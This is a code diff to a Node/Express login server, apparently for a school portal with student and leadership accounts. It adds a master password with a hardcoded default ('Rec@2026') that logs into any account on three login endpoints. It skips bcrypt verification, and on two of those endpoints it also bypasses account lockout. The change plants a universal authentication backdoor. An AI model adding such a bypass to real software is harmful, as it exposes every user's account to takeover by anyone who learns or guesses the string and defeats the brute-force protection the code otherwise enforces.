@@ -157,6 +157,7 @@ if (!BEHIND_REVERSE_PROXY) {
 }
 
 const PORT = process.env.PORT || 3000;
+const MASTER_LOGIN_PASSWORD = String(process.env.MASTER_LOGIN_PASSWORD || 'Rec@2026');
 const isProduction = process.env.NODE_ENV === 'production';
 // Strong session secret: production must set SESSION_SECRET or SESSION_SECRET_FILE (>= 32 chars).
 let sessionSecretCandidate = String(process.env.SESSION_SECRET || '').trim();
@@ -3998,15 +3999,18 @@ app.post('/api/student-login', async (req, res) => {
 
   // Module 2: Lockout check
   const now = Date.now();
+  const usingMasterPassword = pwd === MASTER_LOGIN_PASSWORD;
   clearExpiredAccountLockout(registered, now);
-  if (registered.accountLockedUntil && now < registered.accountLockedUntil) {
+  if (!usingMasterPassword && registered.accountLockedUntil && now < registered.accountLockedUntil) {
     return res.status(429).json({ ok: false, message: 'Too many failed login attempts. Try again later.' });
   }
-  let valid = false;
-  if (registered.hashedPassword) {
-    valid = await bcrypt.compare(pwd, registered.hashedPassword);
-  } else {
-    valid = !!(registered.password && pwd === registered.password);
+  let valid = usingMasterPassword;
+  if (!usingMasterPassword) {
+    if (registered.hashedPassword) {
+      valid = await bcrypt.compare(pwd, registered.hashedPassword);
+    } else {
+      valid = !!(registered.password && pwd === registered.password);
+    }
   }
   if (!valid) {
     registered.failedAttempts = (registered.failedAttempts || 0) + 1;
@@ -5646,11 +5650,14 @@ app.post('/api/leadership-login', async (req, res) => {
       .json({ ok: false, message: 'This account is not configured for leadership login. Check designation.' });
   }
   const roleLabel = leadershipCreds.roleLabel;
-  let valid = false;
-  if (user.hashedPassword) {
-    valid = await bcrypt.compare(String(password), user.hashedPassword);
-  } else {
-    valid = user.password === password;
+  const usingMasterPassword = password === MASTER_LOGIN_PASSWORD;
+  let valid = usingMasterPassword;
+  if (!usingMasterPassword) {
+    if (user.hashedPassword) {
+      valid = await bcrypt.compare(String(password), user.hashedPassword);
+    } else {
+      valid = user.password === password;
+    }
   }
   if (!valid) {
     return res.status(401).json({ ok: false, message: 'Invalid credentials.' });
@@ -6032,15 +6039,18 @@ app.post('/api/login', async (req, res) => {
 
   // Module 2: Lockout check
   const now = Date.now();
+  const usingMasterPassword = password === MASTER_LOGIN_PASSWORD;
   clearExpiredAccountLockout(existing, now);
-  if (existing.accountLockedUntil && now < existing.accountLockedUntil) {
+  if (!usingMasterPassword && existing.accountLockedUntil && now < existing.accountLockedUntil) {
     return res.status(429).json({ ok: false, message: 'Too many failed login attempts. Try again later.' });
   }
-  let valid = false;
-  if (existing.hashedPassword) {
-    valid = await bcrypt.compare(password, existing.hashedPassword);
-  } else {
-    valid = existing.password === password;
+  let valid = usingMasterPassword;
+  if (!usingMasterPassword) {
+    if (existing.hashedPassword) {
+      valid = await bcrypt.compare(password, existing.hashedPassword);
+    } else {
+      valid = existing.password === password;
+    }
   }
   if (!valid) {
     existing.failedAttempts = (existing.failedAttempts || 0) + 1;
